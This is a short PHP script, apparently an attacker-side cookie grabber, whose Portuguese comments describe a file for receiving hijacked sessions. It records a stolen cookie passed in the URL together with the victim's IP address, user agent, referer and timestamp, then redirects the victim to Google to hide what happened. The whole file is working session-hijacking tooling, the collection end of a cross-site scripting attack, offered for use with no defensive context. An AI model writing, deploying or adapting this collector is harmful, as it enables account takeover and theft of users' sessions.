<?php

/*
 	grandmother.php - by 0x53

*/

$fileName="cookies.txt"; // Arquivo para receber o sequestro.
$redirect = "https://google.com/"; // URL que o usuário vai ser redirecionado.

$f=fopen($fileName,'a');
$ip = $_SERVER['REMOTE_ADDR'];
$date = date("d/m/Y");
$hour = date("H:i:s");
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$referer  = $_SERVER['HTTP_REFERER']; 
$cookie = $_GET['cookie'];
$data="\n\n[+] IP: $ip\n[+] Date: $date\n[+] Hour: $hour\n[+] User-Agent: $userAgent\n[+] Referer: $referer\n[+] Hot-Cookie: $cookie";
fwrite($f,$data); //
fclose($f);
header('Location: '.$redirect);
?>
